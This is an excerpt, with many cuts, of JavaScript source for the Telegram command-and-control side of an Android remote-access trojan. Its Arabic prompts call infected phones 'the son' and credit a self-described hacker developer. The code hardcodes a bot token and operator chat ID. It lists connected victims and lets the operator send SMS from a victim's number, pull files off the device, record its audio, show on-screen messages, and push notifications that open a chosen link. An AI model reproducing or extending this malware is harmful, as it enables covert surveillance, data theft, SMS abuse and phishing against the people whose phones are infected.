...
const token = "8382835111:AAHX17EnNDXMhDGYqEM6hMOsg8ZULKHpMO8"
const id = '8314088763'
...
appBot.on('message', (message) => {
    ...
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الابن ')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الابن  الئ الرقم الذي كتبتة قبل قليل....\n\n' +
                '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الابن  الئ الرقم الذي كتبتة قبل قليل....')) {
            ...
            appBot.sendMessage(id,
                ...
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر بدر الضامئ قناة المطور @HACKERBADR ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الابناء  المتصلة"], ["تنفيذ الامر"]],
        ...
        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد سحبة من جهاز الابن ')) {
        ...
        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل صوت الابن ')) {
        ...
        if (message.reply_to_message.text.includes('°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الابن ')) {
        ...
        if (message.reply_to_message.text.includes('°• ادخل الرسالة التي تريدها تظهر كما إشعار')) {
            ...
            appBot.sendMessage(id,
                ...
                '• عندما ينقر الابن  على الإشعار ، سيتم فتح الرابط الذي تقوم بإدخاله ،',
                {reply_markup: {force_reply: true}}
            )
        }
    ...
    if (id == chatId) {
        ...
        if (message.text == 'الابناء  المتصلة') {
            if (appClients.size == 0) {
                ...
                let text = '°• قائمة الابناء  المتصلة :\n\n'
...
appBot.on("callback_query", (callbackQuery) => {
    ...
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الابن \n\n' +
    ...
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل مسار الملف الذي تريد سحبة من جهاز الابن \n\n' +
    ...
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الابن \n\n' +
